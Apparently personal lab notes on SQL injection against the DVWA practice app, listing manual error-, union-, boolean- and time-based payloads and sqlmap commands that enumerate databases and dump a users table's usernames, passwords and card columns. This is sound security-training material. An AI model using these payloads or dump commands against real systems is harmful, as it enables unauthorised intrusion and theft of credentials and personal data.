SQL INJECTION (SQLi)

A. SQLi (**DVWA & Burp Suite**) -> Manual

1. Classic SQLi (Error-Based):
id=1 -> shows 1 record
id=1' -> error
id=1' OR '1'='1 -> shows all records

2. Union-Based SQLi:
id=1' ORDER BY 1# , 2# , ... until error occurs (confirms column count)
id=1' ORDER BY 3# -> error (2 columns here)
id=1' UNION SELECT 1,2# -> shows output of 2 columns (confirms union sqli works)
id=1' UNION SELECT @@version,2# -> db version leaked 

3. Blind SQLi (Boolean-Based):
id=1' AND 1=1# -> data returned
id=1' AND 1=2# -> no error but no data returned as well 

4. Time-Based Blind SQLi:
id=1' AND SLEEP(5)# -> response delayed by 5 secs, no data returned


B. SQLi (**DVWA & SQLMap**) -> Automated

1. Basic Test:
kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" --batch --level=1 --risk=1
-> confirms injection point

2. Identify DBMS:
kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" --banner --batch
-> shows DB version

3. Enumerate Available DBs:
kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" --dbs --batch
-> list of DBs dumped

4. Choose one DB & list tables:
kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuart --tables --batch
-> tables found in 'acuart' DB

5. Extract columns from a table:
kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuart -T users --columns --batch
-> columns inside 'users' table

6. Dump data from 'users' table:
kali$ sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1" -D acuart -T users -C uname,pass,email,cc,cart --dump --batch
-> extracted usernames and password hashes or values
